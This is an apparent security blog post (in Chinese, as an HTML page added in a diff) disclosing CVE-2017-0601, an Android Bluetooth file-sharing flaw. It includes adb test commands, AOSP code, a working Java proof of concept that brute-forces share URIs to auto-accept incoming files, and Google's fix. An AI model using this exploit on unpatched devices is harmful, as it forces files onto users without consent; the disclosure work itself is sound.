@@ -1,0 +1,116 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>蓝牙App漏洞系列分析之一 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">蓝牙App漏洞系列分析之一</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">蓝牙App漏洞系列分析之一</h1><div class="post-meta">May 15, 2017<span> | </span><span class="category"><a href="/categories/安卓/">安卓</a></span></div><div class="post-content"><p>作者：heeeeen@MS509</p>
+<h3 id="0x01-概要"><a href="#0x01-概要" class="headerlink" title="0x01 概要"></a>0x01 概要</h3><p>2017年5月的Android安全公告修复了我们提交的一个蓝牙提权中危漏洞，这个漏洞尽管简单，但比较有意思，能够使本地恶意App绕过用户交互，使用户强制接收外部传入的蓝牙文件。漏洞概要如下：</p>
+<ul>
+<li>CVE: CVE-2017-0601</li>
+<li>BugID: A-35258579</li>
+<li>严重性: 中</li>
+<li>影响的Google设备: All</li>
+<li>Updated AOSP versions: 7.0, 7.1.1, 7.1.2<a id="more"></a></li>
+</ul>
+<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>蓝牙App暴露了一个广播接收器com.android.bluetooth.opp.BluetoothOppReceiver，本地普通App可以向这个Receiver发送广播，查看其OnReceive方法，包含了对多种传入广播Intent Action的处理，但是大多数Intent Action处于保护状态，简单用adb shell可以一一对其测试，比如</p>
+<pre class="lang:default decode:true">adb shell am broadcast -a android.btopp.intent.action.OPEN</pre>
+提示如下错误，说明action处于保护状态
+<pre class="lang:default decode:true">Broadcasting: Intent { act=android.btopp.intent.action.OPEN }
+java.lang.SecurityException: Permission Denial: not allowed to send broadcast android.btopp.intent.action.OPEN from pid=26382, uid=2000
+     at android.os.Parcel.readException(Parcel.java:1683)
+     at android.os.Parcel.readException(Parcel.java:1636)
+     at android.app.ActivityManagerProxy.broadcastIntent(ActivityManagerNative.java:3507)
+     at com.android.commands.am.Am.sendBroadcast(Am.java:772)
+     at com.android.commands.am.Am.onRun(Am.java:404)
+     at com.android.internal.os.BaseCommand.run(BaseCommand.java:51)
+     at com.android.commands.am.Am.main(Am.java:121)
+     at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method)
+     at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:262)</pre>
+但是android.btopp.intent.action.ACCEPT这个Intent Action，却没有保护
+<pre class="lang:default decode:true ">adb shell am broadcast -a android.btopp.intent.action.ACCEPT</pre>
+<pre class="lang:default decode:true">Broadcasting: Intent { act=android.btopp.intent.action.ACCEPT }
+Broadcast completed: result=0</pre>
+进一步分析AOSP代码，发现传入这个Action的Intent时，会将Intent携带Uri指向的db进行更新，更新为用户确认状态。
+<pre class="lang:default decode:true">133  else if (action.equals(Constants.ACTION_ACCEPT)) {
+134            if (V) Log.v(TAG, "Receiver ACTION_ACCEPT");
+135            Uri uri = intent.getData();
+136            ContentValues values = new ContentValues();
+137            values.put(BluetoothShare.USER_CONFIRMATION, BluetoothShare.USER_CONFIRMATION_CONFIRMED);
+138            context.getContentResolver().update(uri, values, null, null);
+139            cancelNotification(context, uri);</pre>
+这个db其实就是蓝牙文件共享的provider，对应的uri为content://con.android.bluetooth.opp/btopp，当通过蓝牙共享接收、发送文件时，该数据库都会增加新的条目，记录接收、发送的状态。该provider记录的信息可以参考BluetoothShare
+<pre class="lang:default decode:true">/**
+* Exposes constants used to interact with the Bluetooth Share manager's content
+* provider.
+* @hide
+*/
+
+public final class BluetoothShare implements BaseColumns {
+    private BluetoothShare() {
+    }
+
+    /**
+     * The permission to access the Bluetooth Share Manager
+     */
+    public static final String PERMISSION_ACCESS = "android.permission.ACCESS_BLUETOOTH_SHARE";
+
+    /**
+     * The content:// URI for the data table in the provider
+     */
+    public static final Uri CONTENT_URI = Uri.parse("content://com.android.bluetooth.opp/btopp");</pre>
+因此，如果我们在Intent中传入某个蓝牙共享对应文件的uri，那么它在蓝牙文件共享Provider中的状态就会被更改为用户确认状态。这里继续进行猜想，进一步，如果我们刚好通过蓝牙传入某个文件，将其状态改为用户确认，是否文件就无需确认，自动接收了呢？幸运的是，的确如此。
+
+### 0x03 漏洞利用
+
+这里还有一个问题要解决，content://com.android.bluetooth.opp/btopp只是整个provider的uri，我们如何知道刚刚通过蓝牙传入文件的uri呢？通过暴力穷举，下面的PoC简单地解决了这个问题，
+<pre class="lang:default decode:true">public class MainActivity extends AppCompatActivity {
+    Button m_btnAccept = null;
+
+    public static final String ACTION_ACCEPT = "android.btopp.intent.action.ACCEPT";
+    public static final String BLUETOOTH_SHARE_URI = "content://com.android.bluetooth.opp/btopp/";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        m_btnAccept = (Button)findViewById(R.id.accept);
+        m_btnAccept.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Intent intent = new Intent();
+                intent.setComponent(new ComponentName("com.android.bluetooth",
+                        "com.android.bluetooth.opp.BluetoothOppReceiver"));
+                intent.setAction(ACTION_ACCEPT);
+                // Guess the incoming bluetooth share uri, normally it increases from 1 by 1 and could be guessed easily.
+                // Then Send broadcast to change the incoming file status
+                for (int i = 0 ; i &lt; 255; i++) {
+                    String uriString = BLUETOOTH_SHARE_URI + Integer.toString(i);
+                    intent.setData(Uri.parse(uriString));
+                    sendBroadcast(intent);
+                }
+            }
+        });
+    }
+}</pre>
+
+<h3 id="0x04-测试方法"><a href="#0x04-测试方法" class="headerlink" title="0x04 测试方法"></a>0x04 测试方法</h3><p>通过蓝牙向测试手机发送文件，此时，手机将会出现提示，要用户拒绝或者接受，这个对话框将会出现约1分钟</p>
+<p><img src="http://www.ms509.com/wp-content/uploads/2017/05/1.png" alt="1"><br>此时运行POC，文件将会自动接收，因此这是一个本地用户交互绕过。如果有恶意程序利用该漏洞一直在后台运行，那么手机将会被强制接收任意蓝牙传入的文件。</p>
+<h3 id="0x05-修复"><a href="#0x05-修复" class="headerlink" title="0x05 修复"></a>0x05 修复</h3><p>Google在Framework的AndroidManifest文件中，将android.btopp.intent.action.ACCEPT和DELINE设为保护状态，普通App无法发出携带这些action的Intent</p>
+<pre class="lang:default decode:true">diff --git a/core/res/AndroidManifest.xml b/core/res/AndroidManifest.xml
+index ec712bb..011884c 100644
+--- a/core/res/AndroidManifest.xml
++++ b/core/res/AndroidManifest.xml
+
+@@ -199,6 +199,8 @@
+     &lt;protected-broadcast android:name="android.btopp.intent.action.OPEN_INBOUND" /&gt;    
+     &lt;protected-broadcast android:name="android.btopp.intent.action.TRANSFER_COMPLETE" /&gt;
+     &lt;protected-broadcast android:name="com.android.bluetooth.gatt.REFRESH_BATCHED_SCAN" /&gt;
++    &lt;protected-broadcast android:name="android.btopp.intent.action.ACCEPT" /&gt;
++    &lt;protected-broadcast android:name="android.btopp.intent.action.DECLINE" /&gt;
+     &lt;protected-broadcast android:name="com.android.bluetooth.pbap.authchall" /&gt;
+     &lt;protected-broadcast android:name="com.android.bluetooth.pbap.userconfirmtimeout" /&gt;  
+     &lt;protected-broadcast android:name="com.android.bluetooth.pbap.authresponse" /&gt;</pre>
+
+<h3 id="0x06时间线"><a href="#0x06时间线" class="headerlink" title="0x06时间线"></a>0x06时间线</h3><ul>
+<li>2017.02.09——提交Google</li>
+<li>2017.03.01——漏洞确认</li>
+<li>2017.05.01——补丁发布</li>
+<li>2017.05.04——漏洞公开</li>
+</ul>
+</div><div class="tags"></div><div class="post-nav"><a href="/2017/06/06/e5-88-86-e4-ba-ab-e4-b8-80-e7-a7-8d-e5-8f-af-e5-85-b3-e9-97-ad-e5-a4-a7-e5-a4-9a-e6-95-b0-e6-9d-80-e8-bd-af-e7-9a-84-e6-8a-80-e6-9c-af-ef-bc-88-e5-af-b9360-e5-ae-89-e5-85-a8-e5-8d-ab-e5-a3-ab/" class="pre">分享一种可关闭大多数杀软的技术（对360安全卫士已验证成功）</a><a href="/2017/05/14/e9-a6-96-e5-8f-91-wannacry-e5-8b-92-e7-b4-a2-e8-bd-af-e4-bb-b6-e6-af-8d-e4-bd-93-e4-b8-bb-e7-a8-8b-e5-ba-8f-e9-80-86-e5-90-91-e5-88-86-e6-9e-90-ef-bc-88-e5-90-ab-e4-b8-b4-e6-97-b6-e8-a7-a3-e5-86-b3/" class="next">首发 | Wannacry勒索软件母体主程序逆向分析（含临时解决方案自动化工具</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/IOS/">IOS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/渗透测试/">渗透测试</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/原创漏洞/">原创漏洞</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/安卓/">安卓</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/">原创漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/安卓/">安卓</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安卓/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/未分类/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/android-drozer/" style="font-size: 15px;">android drozer</a> <a href="/tags/Cknife-Disclaimer/" style="font-size: 15px;">Cknife Disclaimer</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/04/github-e4-bf-a1-e6-81-af-e6-b3-84-e9-9c-b2-e5-8d-87-e7-ba-a7-e7-89-88-e6-a1-88-e4-be-8b/">Github信息泄露升级版案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/14/684/">CVE-2016-10277在MOTO X手机上的漏洞利用实践</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/27/e8-93-9d-e7-89-99app-e6-bc-8f-e6-b4-9e-e7-b3-bb-e5-88-97-e5-88-86-e6-9e-90-e4-b9-8b-e4-ba-8ccve-2017-0639/">蓝牙App漏洞系列分析之二</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/23/Bluetooth-Vul-3/">蓝牙App漏洞系列分析之三</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/14/e5-90-8c-e5-bd-a2-e5-bc-82-e4-b9-89-e5-ad-97-e9-92-93-e9-b1-bc-e6-94-bb-e5-87-bb-ef-bc-8c-e9-92-89-e9-92-89-e4-b8-ad-e6-8b-9b/">“同形异义字”钓鱼攻击，钉钉中招</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/12/Bluetooth-Vul-2/">蓝牙App漏洞系列分析之二</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/06/e5-88-86-e4-ba-ab-e4-b8-80-e7-a7-8d-e5-8f-af-e5-85-b3-e9-97-ad-e5-a4-a7-e5-a4-9a-e6-95-b0-e6-9d-80-e8-bd-af-e7-9a-84-e6-8a-80-e6-9c-af-ef-bc-88-e5-af-b9360-e5-ae-89-e5-85-a8-e5-8d-ab-e5-a3-ab/">分享一种可关闭大多数杀软的技术（对360安全卫士已验证成功）</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/15/e8-93-9d-e7-89-99app-e6-bc-8f-e6-b4-9e-e7-b3-bb-e5-88-97-e5-88-86-e6-9e-90-e4-b9-8b-e4-b8-80/">蓝牙App漏洞系列分析之一</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/14/e9-a6-96-e5-8f-91-wannacry-e5-8b-92-e7-b4-a2-e8-bd-af-e4-bb-b6-e6-af-8d-e4-bd-93-e4-b8-bb-e7-a8-8b-e5-ba-8f-e9-80-86-e5-90-91-e5-88-86-e6-9e-90-ef-bc-88-e5-90-ab-e4-b8-b4-e6-97-b6-e8-a7-a3-e5-86-b3/">首发 | Wannacry勒索软件母体主程序逆向分析（含临时解决方案自动化工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/04/Bluetoooth_Vul_1/">蓝牙App漏洞系列分析之一</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2017 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
